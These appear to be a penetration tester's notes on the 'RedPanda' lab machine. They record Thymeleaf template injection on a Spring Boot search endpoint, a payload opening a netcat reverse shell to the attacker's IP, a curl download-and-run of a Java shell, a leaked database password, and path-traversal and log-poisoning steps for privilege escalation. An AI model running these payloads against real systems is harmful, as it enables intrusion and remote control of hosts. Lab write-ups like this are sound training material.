# RedPanda

## Enumeration
### Nmap
SSH: 8.4
HTTP: 8080 Spring boot

### Gobuster
/stats

### Web
Proxy? p8080
Spring boot

#### POST /search
name=<name>
SSTI

#### GET /stats?author=<name>
Users: woodenk, damian
#### GET /export.xml?author=<name>
#### GET /error

## Pwn
### SSTI
POST /search
`42*42` -> 1764
`#{42*42}` -> ??1764_en_US??

**bad chars**: $~_
**error chars**: %){}\
**encoded chars**: &'"<>

Probably Thymeleaf as templating engine

`*{T(java.lang.System).getenv()}` -> works!
{PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, SHELL=/bin/bash, JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64, TERM=unknown, USER=woodenk, LANG=en_US.UTF-8, SUDO_USER=root, SUDO_COMMAND=/usr/bin/java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar, SUDO_GID=0, MAIL=/var/mail/woodenk, LOGNAME=woodenk, SUDO_UID=0, HOME=/home/woodenk}

`*{T(java.lang.Runtime).getRuntime().exec('nc+-c+sh+10.10.16.6+9001')}`
$ curl 10.10.16.6:9002/shell.java -o /tmp/shell.java
$ java /tmp/shell.java

woodenk $ cat /home/woodenk user.txt
4262cf760b49695154c2a39c05f58fd1

## Priv Esc
```bash
root         864  0.0  0.0   2608   596 ?        Ss   08:52   0:00      _ /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         865  0.0  0.2   9416  4584 ?        S    08:52   0:00          _ sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
woodenk      875  3.5 10.2 3101420 208768 ?      Sl   08:52   0:18              _ java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
```

### MySQL
"jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule"
$ mysql -h localhost -u woodenk -p RedPandazRule red_panda

### LogParser app
```java
<dependency>
  <groupId>org.jdom</groupId>
  <artifactId>jdom2</artifactId>
  <version>2.0.6.1</version>
</dependency>
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```
/opt/panda_search/src/main/resources/static/img
mysql> insert into pandas (name, bio, imgloc, author) values ('Exploit_panda', 'It will try to exploit you!', '../../../../../../home/woodenk/exploit.jpg', 'exploit');

$ echo '200||10.10.16.6||Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0||/../../../../../../home/woodenk/exploit.jpg' >> redpanda.log
